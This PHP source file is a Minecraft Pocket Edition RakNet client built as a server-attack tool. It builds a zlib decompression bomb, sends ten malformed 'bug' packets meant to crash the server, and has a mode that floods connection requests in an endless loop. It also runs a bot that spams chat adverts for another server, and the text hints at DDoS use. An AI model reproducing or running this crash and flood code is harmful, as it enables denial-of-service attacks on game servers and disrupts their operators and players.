<?php

//declare(strict_types=1);


namespace Frago9876543210\PocketEditionClient;


use Frago9876543210\PocketEditionClient\protocol\BlockEntityDataPacket;
use Frago9876543210\PocketEditionClient\protocol\DataPacket;
use Frago9876543210\PocketEditionClient\protocol\DisconnectPacket;
use Frago9876543210\PocketEditionClient\protocol\FullChunkDataPacket;
use Frago9876543210\PocketEditionClient\protocol\LoginPacket;
use Frago9876543210\PocketEditionClient\protocol\TextPacket;
use Frago9876543210\PocketEditionClient\protocol\PacketPool;
use Frago9876543210\PocketEditionClient\protocol\PlayStatusPacket;
use Frago9876543210\PocketEditionClient\protocol\RequestChunkRadiusPacket;
use Frago9876543210\PocketEditionClient\protocol\ResourcePackClientResponsePacket;
use Frago9876543210\PocketEditionClient\protocol\ResourcePacksInfoPacket;
use Frago9876543210\PocketEditionClient\protocol\SetTimePacket;
use Frago9876543210\PocketEditionClient\protocol\SetTitlePacket;
use Frago9876543210\PocketEditionClient\protocol\TransferPacket;
use Frago9876543210\PocketEditionClient\protocol\ClientboundMapItemDataPacket;
use Frago9876543210\PocketEditionClient\protocol\ChunkRadiusUpdatedPacket;
use Frago9876543210\PocketEditionClient\protocol\ContainerSetSlotPacket;
use Frago9876543210\PocketEditionClient\protocol\ReplaceItemInSlotPacket;
use Frago9876543210\PocketEditionClient\protocol\ContainerClosePacke;
use Frago9876543210\PocketEditionClient\protocol\ContainerClosePacket;
use Frago9876543210\PocketEditionClient\protocol\CommandStepPacket;
use Frago9876543210\PocketEditionClient\protocol\CameraPacket;
use Frago9876543210\PocketEditionClient\protocol\StartGamePacket;
use Frago9876543210\PocketEditionClient\protocol\MobEquipmentPacket;
use Frago9876543210\PocketEditionClient\protocol\AnimatePacket;
use Frago9876543210\PocketEditionClient\protocol\PlayerListPacket;
use Frago9876543210\PocketEditionClient\protocol\UseItemPacket;
use Frago9876543210\PocketEditionClient\protocol\MovePlayerPacket;
use Frago9876543210\PocketEditionClient\run;
use pocketmine\math\Vector3;
use pocketmine\network\mcpe\NetworkBinaryStream;
use pocketmine\network\mcpe\NetworkCompression;
use pocketmine\network\mcpe\PacketStream;
use pocketmine\item\Item;
use raklib\protocol\ACK;
use raklib\protocol\ConnectedPing;
use raklib\protocol\ConnectionRequest;
use raklib\protocol\ConnectionRequestAccepted;
use raklib\protocol\Datagram;
use raklib\protocol\UnconnectedPing;
use raklib\protocol\UnconnectedPong;
use raklib\protocol\EncapsulatedPacket;
use pocketmine\utils\UUID;
use raklib\protocol\NACK;
use raklib\protocol\NewIncomingConnection;
use raklib\protocol\OpenConnectionReply1;
use raklib\protocol\OpenConnectionReply2;
use raklib\protocol\OpenConnectionRequest1;
use raklib\protocol\OpenConnectionRequest2;
use raklib\protocol\Packet;
use raklib\protocol\PacketReliability;
use raklib\server\UDPServerSocket;
use pocketmine\entity\Attribute;

class PocketEditionClient extends UDPServerSocket{
    public const MTU = 1492;

    private const MAX_SPLIT_SIZE = 128;
    private const MAX_SPLIT_COUNT = 4;

    private const CHANNEL_COUNT = 32;

    public static $WINDOW_SIZE = 2048;
    
    public $eid;
    
    public $pos;
    
    public $pos2;
    
    public $logined = false;

    public $sendcheck = 0;
    
    public $lastUpdate2 = 0;
    
    public $task = [];

    /** @var Address */
    private $serverAddress;
    /** @var int */
    private $clientID;
    /** @var int */
    private $lastUpdate;

    /** @var int */
    private $seqNumber = 0;
    /** @var int */
    private $splitID = 0;
    /** @var int */
    private $messageIndex = 0;
    /** @var int */
    private $orderIndex = 0;

    public $a;

    /** @var int[] */
    private $ACKQueue = [];
    /** @var int[] */
    private $NACKQueue = [];
    /** @var Datagram[] */
    private $recoveryQueue = [];
    /** @var Datagram[] */
    private $packetToSend = [];

    /** @var int */
    private $windowStart = 0;
    /** @var int */
    private $windowEnd;
    /** @var int */
    private $highestSeqNumberThisTick = -1;

    /** @var int */
    private $reliableWindowStart = 0;
    /** @var int */
    private $reliableWindowEnd;
    /** @var bool[] */
    private $reliableWindow = [];

    /** @var int[] */
    private $receiveOrderedIndex;
    /** @var int[] */
    private $receiveSequencedHighestIndex;
    /** @var EncapsulatedPacket[][] */
    private $receiveOrderedPackets;

    /** @var Datagram[][] */
    private $splitPackets = [];

    /** @var bool */
    public $isLoggedIn = false;

    public $start;


    public function __construct(Address $bindAddress, Address $serverAddress){
        parent::__construct($bindAddress);
        $this->serverAddress = $serverAddress;

        $this->clientID = mt_rand(0, PHP_INT_MAX);
        $this->lastUpdate = time();

        $this->windowEnd = self::$WINDOW_SIZE;
        $this->reliableWindowEnd = self::$WINDOW_SIZE;

        $this->receiveOrderedIndex = array_fill(0, self::CHANNEL_COUNT, 0);
        $this->receiveSequencedHighestIndex = array_fill(0, self::CHANNEL_COUNT, 0);

        $stream = new NetworkBinaryStream();

        $stream->putByte(0x34);
        $stream->putUnsignedVarInt(1);
        $stream->putEntityUniqueId(0);

        $count = 5873523;
        $stream->putUnsignedVarInt($count);
        $stream->put(str_repeat("\x00", $count));

        $uncompressed = $stream->buffer;
        $stream->reset();
        $stream->putString($uncompressed);

        $this->raw = zlib_encode($stream->buffer, ZLIB_ENCODING_DEFLATE, 9);
        //
        gc_enable();
    }

    protected function getClassName(object $class) : string{
        return (new \ReflectionObject($class))->getShortName();
    }

    protected function sendRakNetPacket(Packet $packet) : void{
        $packet->encode();
        if(!$packet instanceof Datagram){
        }
        $this->writePacket($packet->buffer, $this->serverAddress->ip, $this->serverAddress->port);
    }

    protected function sendRakNetPacket1($mes) : void{
        $mes->encode();
        $this->writePacket($mes, $this->serverAddress->ip, $this->serverAddress->port);
    }

    protected function sendSessionRakNetPacket(Packet $packet) : void{
        $packet->encode();
        if(!$packet instanceof Datagram){
            //echo $this->getClassName($packet) . PHP_EOL;
        }
        $encapsulated = new EncapsulatedPacket();
        $encapsulated->reliability = PacketReliability::UNRELIABLE;
        $encapsulated->buffer = $packet->buffer;
        $this->sendDatagramWithEncapsulated($encapsulated);
    }

    public function isTermo() : bool{
        sleep(1);
        $this->readPacket($buffer, $from, $to);
        $this->sendOpenConnectionRequest1();
        return empty($buffer);
    }

    protected function sendDatagramWithEncapsulated(EncapsulatedPacket $packet) : void{
        $datagram = new Datagram();
        $datagram->sendTime = microtime(true);
        $datagram->headerFlags = Datagram::BITFLAG_NEEDS_B_AND_AS;
        $datagram->packets = [$packet];
        $datagram->seqNumber = $this->seqNumber++;

        $this->recoveryQueue[$datagram->seqNumber] = $datagram;
        $this->sendRakNetPacket($datagram);
        $this->ACKQueue[] = $datagram->seqNumber;
    }

    protected function sendDataPacket($packets, ?int $compressionLevel = null) : void{
        $stream = new PacketStream();
        if(!is_array($packets)){
            $packets = [$packets];
        }
        foreach($packets as $packet){
            $stream->putPacket($packet);
        }
        $this->sendRawData(NetworkCompression::compress($stream->buffer, $compressionLevel));
    }

    protected function sendRawData(string $buffer) : void{
        $encapsulated = new EncapsulatedPacket();
        $encapsulated->reliability = PacketReliability::RELIABLE_ORDERED;
        $encapsulated->buffer = "\xfe" . $buffer;
        $this->sendEncapsulated($encapsulated);
    }

    protected function sendEncapsulated(EncapsulatedPacket $packet) : void{
        if(PacketReliability::isOrdered($packet->reliability)){
            $packet->orderIndex = $this->orderIndex++;
        }

        $maxSize = self::MTU - 60;
        if(strlen($packet->buffer) > $maxSize){
            $buffers = str_split($packet->buffer, $maxSize);
            $bufferCount = count($buffers);
            $splitID = ++$this->splitID % 65536;

            foreach($buffers as $count => $buffer){
                $pk = new EncapsulatedPacket();
                $pk->splitID = $splitID;
                $pk->hasSplit = true;
                $pk->splitCount = $bufferCount;
                $pk->reliability = $packet->reliability;
                $pk->splitIndex = $count;
                $pk->buffer = $buffer;
                if(PacketReliability::isReliable($pk->reliability)){
                    $pk->messageIndex = $this->messageIndex++;
                }
                $pk->sequenceIndex = $packet->sequenceIndex;
                $pk->orderChannel = 0;
                $pk->orderIndex = $packet->orderIndex;
                $this->sendDatagramWithEncapsulated($pk);
            }
        }else{
            if(PacketReliability::isReliable($packet->reliability)){
                $packet->messageIndex = $this->messageIndex++;
            }
            $this->sendDatagramWithEncapsulated($packet);
        }
    }

    //

    public function sendOpenConnectionRequest1() : void{
        $pk = new OpenConnectionRequest1();
        $pk->protocol = 6;
        $pk->mtuSize = self::MTU - 28;
        $this->sendRakNetPacket($pk);
    }
    public function sendOpenConnectionRequest2() : void{
        $pk = new OpenConnectionRequest2();
        $pk->clientID = $this->clientID;
        $pk->serverAddress = $this->serverAddress;
        $pk->mtuSize = self::MTU;
        $this->sendRakNetPacket($pk);
    }
    public function sendConnectionRequest() : void{
        $pk = new ConnectionRequest();
        $pk->clientID = $this->clientID;
        $pk->sendPingTime = time();
        $this->sendSessionRakNetPacket($pk);
    }
    public function sendNewIncomingConnection() : void{
    	$pk = new NewIncomingConnection();
        $pk->address = $this->serverAddress;
        for($i = 0; $i < 10; ++$i){
            $pk->systemAddresses[$i] = $pk->address;
        }
        $pk->sendPingTime = $pk->sendPongTime = 0;
        $this->sendSessionRakNetPacket($pk);
    }
    public function sendNewIncomingConnection1() : void{
    	$pk = new NewIncomingConnection();
        $pk->address = $this->serverAddress;
        for($i = 0; $i < 10; ++$i){
            $pk->systemAddresses[$i] = $pk->address;
        }
        $pk->sendPingTime = $pk->sendPongTime = -999999;
        $this->sendSessionRakNetPacket($pk);
        $b = $pk->buffer;
        $b = $b.str_repeat("1", 9999);
        $this->sendRawData($b);
    }
    public function sendLoginPacket() : void{
        $pk = new LoginPacket();
        $this->a = LoginPacket::randomString(mt_rand(4, 16));
        $pk->username = $this->a;
        $pk->serverAddress = $this->serverAddress;
        $this->sendDataPacket($pk);
    }
    public function tick() : void{
        if($this->readPacket($buffer, $this->serverAddress->ip, $this->serverAddress->port) !== false){
            if(($packet = RakNetPool::getPacket($buffer)) !== null){
                $this->handlePacket($packet);
            }
        }
        $this->update();
        if((time() - $this->lastUpdate) >= 7){
            $this->lastUpdate = time();

            $pk = new ConnectedPing();
            $pk->sendPingTime = 0;
            $this->sendSessionRakNetPacket($pk);
        }
        if((time() - $this->lastUpdate2) >= 3 && $this->logined){
            $this->lastUpdate2 = time();
        }
    }

    protected function update() : void{
        $diff = $this->highestSeqNumberThisTick - $this->windowStart + 1;
        assert($diff >= 0);
        if($diff > 0){
    

            $this->windowStart += $diff;
            $this->windowEnd += $diff;
        }

        if(count($this->ACKQueue) > 0){
            $pk = new ACK();
            $pk->packets = $this->ACKQueue;
            $this->sendRakNetPacket($pk);
            $this->ACKQueue = [];
        }

        if(count($this->NACKQueue) > 0){
            $pk = new NACK();
            $pk->packets = $this->NACKQueue;
            $this->sendRakNetPacket($pk);
            $this->NACKQueue = [];
        }

        if(count($this->packetToSend) > 0){
            foreach($this->packetToSend as $k => $pk){
                $this->sendSessionRakNetPacket($pk);
                unset($this->packetToSend[$k]);
            }
            if(count($this->packetToSend) > self::$WINDOW_SIZE){ //TODO: check limit
                $this->packetToSend = [];
            }
        }

        foreach($this->recoveryQueue as $seq => $pk){
            if($pk->sendTime < (time() - 8)){
                $this->packetToSend[] = $pk;
                unset($this->recoveryQueue[$seq]);
            }else{
                break;
            }
        }
        /*foreach($this->task as $n => $task){
            $task->sec--;
            if($task->sec <= 0){
                
            }
        }*/
    }

    protected function handlePacket(Packet $packet) : void{
        /*if(!$packet instanceof Datagram){
            echo "\t* " . $this->getClassName($packet) . PHP_EOL;
        }*/

        if($packet instanceof Datagram){
            $this->handleDatagram($packet);
        }elseif($packet instanceof ACK){
            /** @var int $seq */
            foreach($packet->packets as $seq){
                if(isset($this->recoveryQueue[$seq])){
                    unset($this->recoveryQueue[$seq]);
                }
            }
        }elseif($packet instanceof NACK){
            foreach($packet->packets as $seq){
                if(isset($this->recoveryQueue[$seq])){
                    $this->packetToSend[] = $this->recoveryQueue[$seq];
                    unset($this->recoveryQueue[$seq]);
                }
            }
        }elseif($packet instanceof OpenConnectionReply1){
            $this->sendOpenConnectionRequest2();
        }elseif($packet instanceof OpenConnectionReply2){
            $this->sendConnectionRequest();
        }elseif($packet instanceof ConnectionRequestAccepted){
            $babab = file_get_contents('crash.txt');
            if ($babab === "1") {
            	$this->sendNewIncomingConnection();
            	$this->testbug10();
                $this->testBug8();
                $this->testBug7();
                $this->testBug6();
                $this->testBug5();
                $this->testBug4();
                $this->testBug3();
                $this->testBug1(new Vector3(131, 81, 125));
                $this->testBug2();
                $this->testBug9();
                echo "\nВсе 10-ть багов успешно отправлены!";
                $crash = 'crash.txt';
                file_put_contents($crash, 3);
                require_once "vendor/autoload.php";
                ini_set("memory_limit", "-1");
                RakNetPool::init();
                PacketPool::init();
                Attribute::init();
                $client = new PocketEditionClient1(new Address("0.0.0.0", mt_rand(10000,60000)), new Address($this->serverAddress->ip, $this->serverAddress->port));
                while(true){
                    $client->tick();
                }
            }elseif ($babab === "0") {
            	$this->sendNewIncomingConnection();
                echo "\nСессия создана!";
            	$this->sendLoginPacket();
                echo "\nЛогин пакет успешно отправлен!";
            }elseif ($babab === "2") {
            	$this->sendNewIncomingConnection();
            	for ($i=0; $i < PHP_INT_MAX; $i++) {
            		$this->sendNewIncomingConnection1();
            		$this->sendConnectionRequest();
            		$this->sendOpenConnectionRequest2();
            		$this->sendOpenConnectionRequest1();
            	    echo PHP_EOL.'Отправлено пакетов: '.$i;
            	}
            }
        }
    }

    protected function handleDatagram(Datagram $packet) : void{
        if($packet->seqNumber < $this->windowStart or $packet->seqNumber > $this->windowEnd or isset($this->ACKQueue[$packet->seqNumber])){
            //echo "Received duplicate or out-of-window packet from server (sequence number $packet->seqNumber, window " . $this->windowStart . "-" . $this->windowEnd . ")\n";
            //return;
        }
        unset($this->NACKQueue[$packet->seqNumber]);
        $this->ACKQueue[$packet->seqNumber] = $packet->seqNumber;
        if($this->highestSeqNumberThisTick < $packet->seqNumber){
            $this->highestSeqNumberThisTick = $packet->seqNumber;
        }
        if($packet->seqNumber === $this->windowStart){
            for(; isset($this->ACKQueue[$this->windowStart]); ++$this->windowStart){
                ++$this->windowEnd;
            }
        }elseif($packet->seqNumber > $this->windowStart){
            for($i = $this->windowStart; $i < $packet->seqNumber; ++$i){
                if(!isset($this->ACKQueue[$i])){
                    $this->NACKQueue[$i] = $i;
                }
            }
        }else{
            assert(false, "received packet before window start");
        }
        foreach($packet->packets as $pk){
            $this->handleEncapsulatedPacket($pk);
        }
    }
    private function handleEncapsulatedPacket(EncapsulatedPacket $packet) : void{
        if($packet->messageIndex !== null){
            if($packet->messageIndex < $this->reliableWindowStart or $packet->messageIndex > $this->reliableWindowEnd or isset($this->reliableWindow[$packet->messageIndex])){
                return;
            }
            $this->reliableWindow[$packet->messageIndex] = true;
            if($packet->messageIndex === $this->reliableWindowStart){
                for(; isset($this->reliableWindow[$this->reliableWindowStart]); ++$this->reliableWindowStart){
                    unset($this->reliableWindow[$this->reliableWindowStart]);
                    ++$this->reliableWindowEnd;
                }
            }
        }
        if($packet->hasSplit and ($packet = $this->handleSplit($packet)) === null){
            return;
        }
        if(PacketReliability::isSequenced($packet->reliability)){
            if($packet->sequenceIndex < $this->receiveSequencedHighestIndex[$packet->orderChannel] or $packet->orderIndex < $this->receiveOrderedIndex[$packet->orderChannel]){
                return;
            }
            $this->receiveSequencedHighestIndex[$packet->orderChannel] = $packet->sequenceIndex + 1;
            $this->handleEncapsulatedPacketRoute($packet);
        }elseif(PacketReliability::isOrdered($packet->reliability)){
            if($packet->orderIndex === $this->receiveOrderedIndex[$packet->orderChannel]){
                $this->receiveSequencedHighestIndex[$packet->orderIndex] = 0;
                $this->receiveOrderedIndex[$packet->orderChannel] = $packet->orderIndex + 1;
                $this->handleEncapsulatedPacketRoute($packet);
                for($i = $this->receiveOrderedIndex[$packet->orderChannel]; isset($this->receiveOrderedPackets[$packet->orderChannel][$i]); ++$i){
                    $this->handleEncapsulatedPacketRoute($this->receiveOrderedPackets[$packet->orderChannel][$i]);
                    unset($this->receiveOrderedPackets[$packet->orderChannel][$i]);
                }
                $this->receiveOrderedIndex[$packet->orderChannel] = $i;
            }elseif($packet->orderIndex > $this->receiveOrderedIndex[$packet->orderChannel]){
                $this->receiveOrderedPackets[$packet->orderChannel][$packet->orderIndex] = $packet;
            }else{
            }
        }else{
            $this->handleEncapsulatedPacketRoute($packet);
        }
    }
    private function handleSplit(EncapsulatedPacket $packet) : ?EncapsulatedPacket{
        if($packet->splitCount >= self::MAX_SPLIT_SIZE or $packet->splitIndex >= self::MAX_SPLIT_SIZE or $packet->splitIndex < 0){
            echo "Invalid split packet part from server, too many parts or invalid split index (part index $packet->splitIndex, part count $packet->splitCount)\n";
            return null;
        }
        if(!isset($this->splitPackets[$packet->splitID])){
            if(count($this->splitPackets) >= self::MAX_SPLIT_COUNT){
                echo "Ignored split packet part from server because reached concurrent split packet limit of " . self::MAX_SPLIT_COUNT . PHP_EOL;
                return null;
            }
            $this->splitPackets[$packet->splitID] = [$packet->splitIndex => $packet];
        }else{
            $this->splitPackets[$packet->splitID][$packet->splitIndex] = $packet;
        }
        if(count($this->splitPackets[$packet->splitID]) === $packet->splitCount){ //got all parts, reassemble the packet
            $pk = new EncapsulatedPacket();
            $pk->buffer = "";
            $pk->reliability = $packet->reliability;
            $pk->messageIndex = $packet->messageIndex;
            $pk->sequenceIndex = $packet->sequenceIndex;
            $pk->orderIndex = $packet->orderIndex;
            $pk->orderChannel = $packet->orderChannel;
            for($i = 0; $i < $packet->splitCount; ++$i){
                $pk->buffer .= $this->splitPackets[$packet->splitID][$i]->buffer;
            }
            $pk->length = strlen($pk->buffer);
            unset($this->splitPackets[$packet->splitID]);
            return $pk;
        }
        return null;
    }
    private function handleEncapsulatedPacketRoute(EncapsulatedPacket $packet) : void{
        if(($pk = RakNetPool::getPacket($packet->buffer)) !== null){
            $this->handlePacket($pk);
        }else{
            if($packet->buffer !== "" && $packet->buffer{0} === "\xfe"){
                $payload = substr($packet->buffer, 1);
                try{
                    $stream = new PacketStream(NetworkCompression::decompress($payload));
                }catch(\Exception $e){
                    return;
                }
                while(!$stream->feof()){
                    $this->handleDataPacket(PacketPool::getPacket($stream->getString()));
                }
            }
        }
    }
    protected function handleDataPacket(DataPacket $packet) : void{
        $class = $this->getClassName($packet);
        try{
            $packet->decode();
        }catch(\Throwable $e){
            echo "Error in decode " . $class . PHP_EOL . $e->getMessage() . PHP_EOL;
            return;
        }
        if($packet instanceof PlayStatusPacket){
        	if($packet->status === PlayStatusPacket::PLAYER_SPAWN){
        		echo "Бот вошёл";
        		$this->sendMessage("ddosenkavas");
                sleep(1);
                $this->sendMessage("ddosenkavas");
        		sleep(2);
        		for ($i=0; $i < 99999; $i++) { 
        			$this->sendMessage("МИКС НАЙС ТОП!");
        			sleep(2);
                    $this->sendMessage("ВСЕ НА МИКС НАЙС!");
                    sleep(2);
                    $this->sendMessage("𝘗𝘓𝘈𝘠.𝘔𝘐𝘟𝘕𝘐𝘊𝘌.𝘙𝘜 19132");
                    sleep(2);
        		}
        	}
        }elseif($packet instanceof DisconnectPacket){
            echo "\t\t\t{$packet->message}\n";
        }elseif($packet instanceof ResourcePacksInfoPacket && !$this->isLoggedIn){
            $this->isLoggedIn = true;
            $pk = new ResourcePackClientResponsePacket();
            $pk->status = ResourcePackClientResponsePacket::STATUS_COMPLETED;
            $this->sendDataPacket($pk);
        }elseif($packet instanceof StartGamePacket){
            $pk = new RequestChunkRadiusPacket();
            $pk->radius = 5;
            $this->sendDataPacket($pk);
            $this->eid = $packet->entityRuntimeId;
            $this->pos = new Vector3($packet->playerPosition->x, $packet->playerPosition->y, $packet->playerPosition->z);
            $this->pos2 = new Vector3($packet->playerPosition->x, $packet->playerPosition->y, $packet->playerPosition->z);
        }elseif($packet instanceof TransferPacket){
            var_dump($packet);
        }

        if ($packet instanceof FullChunkDataPacket || $packet instanceof SetTimePacket) {
        	return;
        }
    }
    public function sendMessage($m){
        $pk = new TextPacket;
        $pk->type = 1;
        $pk->source = $this->a;
        $pk->message = $m;
        $pk->parameters = [];
        $this->sendDataPacket($pk);
    }
    public function test() : void{
    	$pk = new MovePlayerPacket;
    	$pk->entityRuntimeId = 117273;
    	$pk->position = new Vector3(rand(1, 99999), rand(1, 256), rand(1, 99999));
	    $pk->yaw = -34;
	    $pk->bodyYaw = -99;
	    $pk->pitch = -99;
	    $pk->onGround = true; //TODO
	    $pk->ridingEid = 0;
	    $pk->int1 = 0;
	    $pk->int2 = 0;
	    $this->sendDataPacket($pk);
    }
    // BUGS
    protected function testBug1(Vector3 $position) : void{
        $position->floor();
        $pk = new BlockEntityDataPacket();
        $pk->x = $position->x;
        $pk->y = $position->y;
        $pk->z = $position->z;
        $pk->namedtag = "";
        $this->sendDataPacket($pk);
    }
    protected function testBug2() : void{
        $pk = new ClientboundMapItemDataPacket;
        $pk->mapId = 1;
        $pk->type = 0x08;
        $pk->eids = [0,2,3,4,5];
        $this->sendDataPacket($pk);
        $b = $pk->buffer;
        for($i=0;$i<=300000;$i++){
            $pk->eids[] = $i;
        }
    }
    protected function testBug3() : void{
        $pk = new ContainerSetSlotPacket;
        $this->sendRawData($this->raw);
        $pk->windowid = -7444781;
        $pk->slot = -754681;
        $pk->item = Item::get(340);
        $this->sendDataPacket($pk);
        $b = $pk->buffer;
        $b = $b.str_repeat("1",5888);
        $this->sendRawData($b);
    }
    protected function testBug4() : void{
        $pk = new ContainerClosePacket;
        $this->sendRawData($this->raw);
        $pk->windowid = -7444781;
        $this->sendDataPacket($pk);
        $b = $pk->buffer;
        $b = $b.str_repeat("1",5888);
        $this->sendRawData($b);
    }
    protected function testBug5() : void{
        $pk = new ContainerClosePacke;
        $this->sendRawData($this->raw);
        $pk->windowidd = -7444781;
        $this->sendDataPacket($pk);
    }
    protected function testBug6() : void{
        $pk = new CameraPacket;
        $this->sendRawData($this->raw);
        $pk->cameraUniqueId = -7444781;
        $pk->playerUniqueId = -7444781;
        $this->sendDataPacket($pk);
        $b = $pk->buffer;
        $b = $b.str_repeat("1",5888);
        $this->sendRawData($b);
    }
    protected function testBug7() : void{
        $pk = new ChunkRadiusUpdatedPacket;
        $pk->radius = 0;
        $this->sendDataPacket($pk);
        $b = $pk->radius;
        $b = $b.str_repeat("1",5888);
        $this->sendRawData($b);
    }
    protected function testbug8() : void{
        $pk = new CameraPacket;
        $this->sendRawData($this->raw);
        $pk->cameraUniqueId = -99999999;
        $pk->playerUniqueId = -99999999;
        $this->sendDataPacket($pk);
        $b = $pk->buffer;
        $b = $b.str_repeat("1",5888);
        $this->sendRawData($b);
    }
    protected function testBug9() : void{
        $this->sendRawData($this->raw);
    }
    protected function testbug10() : void{ //
    	$pk = new CommandStepPacket;
        $pk->command = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	    $pk->overload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	    $pk->uvarint1 = "akldkdkakdad";
	    $pk->currentStep = 1;
	    $pk->done = true;
	    $pk->clientId = -999999999;
	    $pk->inputJson = "";
	    $pk->outputJson = "";
	    $this->sendDataPacket($pk);
    }
}